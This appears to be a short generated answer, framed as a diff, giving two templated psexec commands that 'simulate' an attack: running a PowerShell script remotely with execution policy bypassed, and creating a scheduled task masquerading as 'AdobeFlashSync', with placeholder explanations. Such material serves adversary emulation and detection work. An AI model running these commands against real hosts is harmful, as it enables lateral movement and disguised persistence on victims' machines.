@@ -1,0 +1,16 @@
+Here are the command lines that simulate the attack behavior:
+
+Command:`psexec \\<target_computer> -u <user_name> -n <timeout> -l -c -a <cpu_cores> cmd /c "powershell -ExecutionPolicy Bypass -File <script_path>"`
+Command:`psexec \\<target_computer> -u <user_name> -n <timeout> -h -a <cpu_cores> cmd /c "schtasks /create /tn AdobeFlashSync /tr '<command_line>' /st <start_time>"`
+
+Note:
+
+* `<target_computer>` is the name of the remote computer to be attacked.
+* `<user_name>` is the user account under which the process will run.
+* `<timeout>` is the timeout in seconds connecting to remote computers. You can set it according to your needs, for example: `-n 10`.
+* `<cpu_cores>` is the number of processors where the application can run (e.g., `2,4`).
+* `<script_path>` is the path to the PowerShell script that will be executed.
+* `<command_line>` is the command line that will be used to recreate JavaScript code and execute it.
+* `<start_time>` is the time at which the scheduled task will start.
+
+These commands simulate the attack behavior by executing a PowerShell script using psexec, creating a scheduled task named "AdobeFlashSync" with a specific command line, and running it at a specified time.
